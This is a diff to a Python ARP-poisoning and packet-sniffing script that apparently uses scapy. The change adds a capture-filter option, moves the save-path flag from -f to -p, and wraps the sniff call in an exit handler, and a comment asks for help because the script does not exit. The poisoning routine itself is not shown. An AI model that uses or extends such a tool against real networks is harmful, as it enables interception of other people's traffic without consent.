@@ -13,13 +13,15 @@ parser.add_option('-i',dest="interface",help='Specify the interface to use')
 parser.add_option('-t',dest='target',help='Specify a particular host to ARP posion')
 parser.add_option('-d',dest='disguise',help='Specify a host you want to fake')
 parser.add_option('-c',dest='packet_c',help="How many packets you want to catch(optional)")
-parser.add_option('-f',dest='file_p',help='The packets path you want to save(optional)')
+parser.add_option('-p',dest='file_p',help='The packets path you want to save(optional)')
+parser.add_option('-f',dest='filter',help="To filter packet(optional)")
 (options,args)=parser.parse_args()
 interface = options.interface
 target = options.target
 disguise = options.disguise
 packet_count = options.packet_c
 file_path = options.file_p
+filter = options.filter
 
 if target is None:
 	print 'target ip can\'t be none'
@@ -68,7 +70,11 @@ poison_th.start()
 print "begin!"
 
 try:
-	packets = sniff(count=packet_count,iface=interface)
+	try:
+		packets = sniff(count=packet_count,iface=interface,filter=filter)
+	except NameError:
+		print "exit"
+		sys.exit(0)
 	wrpcap(file_path,packets)
 	kill_s()
 	sys.exit()
@@ -76,4 +82,4 @@ except KeyboardInterrupt:
 	kill_s()
 	sys.exit(0)
 
-#help me change the code it can't exit
+#help me to modify the code it can't exit
